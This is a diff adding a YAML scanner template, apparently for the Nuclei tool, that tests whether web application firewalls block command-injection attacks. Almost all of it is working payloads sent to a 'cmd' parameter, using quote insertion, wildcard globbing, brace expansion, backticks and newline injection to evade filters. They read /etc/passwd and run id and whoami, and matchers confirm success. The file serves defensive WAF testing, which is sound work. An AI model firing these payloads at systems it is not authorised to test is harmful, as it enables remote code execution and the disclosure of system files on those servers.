@@ -1,0 +1,171 @@
+id: waf-rce-bypass
+info:
+  name: WAF Remote Code Execution Bypass
+  author: waftester
+  severity: critical
+  description: |
+    Tests WAF effectiveness against command injection and RCE bypass techniques.
+    Covers OS command injection separators, quote insertion, IFS manipulation,
+    brace expansion, wildcard globbing, variable substitution, base64-encoded
+    commands, and evasion techniques effective against major WAF vendors.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+    - https://github.com/0xInfection/Awesome-WAF
+    - https://portswigger.net/web-security/os-command-injection
+  tags: rce,cmdi,waf,bypass,owasp-a03,injection,waftester
+  classification:
+    cwe-id:
+      - CWE-78
+      - CWE-94
+      - CWE-693
+  metadata:
+    verified: true
+    max-request: 24
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # Standard command injection separators
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=;cat /etc/passwd"
+      - "{{BaseURL}}/?cmd=|whoami"
+      - "{{BaseURL}}/?cmd=||id"
+      - "{{BaseURL}}/?cmd=&&id"
+      - "{{BaseURL}}/?cmd=;ping+-c+1+127.0.0.1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "uid="
+          - "PING"
+        condition: or
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\([a-z]+\\)"
+
+  # Quote insertion - break command parsing
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=;c'a't /etc/passwd"
+      - "{{BaseURL}}/?cmd=;c\"a\"t /etc/passwd"
+      - "{{BaseURL}}/?cmd=;w'h'o'a'm'i"
+      - "{{BaseURL}}/?cmd=;w\"h\"o\"a\"m\"i"
+      - "{{BaseURL}}/?cmd=;/b'i'n/c'a't /e't'c/p'a's's'w'd"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # IFS and variable substitution
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=;cat\t/etc/passwd"
+      - "{{BaseURL}}/?cmd=;{cat,/etc/passwd}"
+      - "{{BaseURL}}/?cmd=;cat</etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Wildcard globbing - bypass keyword filters
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=;/???/??t /???/??????"
+      - "{{BaseURL}}/?cmd=;/???/[c]at /???/passwd"
+      - "{{BaseURL}}/?cmd=;/bi?/ca? /et?/passw?"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Backtick and subshell execution
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=`id`"
+      - "{{BaseURL}}/?cmd=`whoami`"
+      - "{{BaseURL}}/?cmd=;echo `cat /etc/passwd`"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Newline and carriage return injection
+  - method: GET
+    path:
+      - "{{BaseURL}}/?cmd=valid%0aid"
+      - "{{BaseURL}}/?cmd=valid%0d%0aid"
+      - "{{BaseURL}}/?cmd=valid%0acat%20/etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
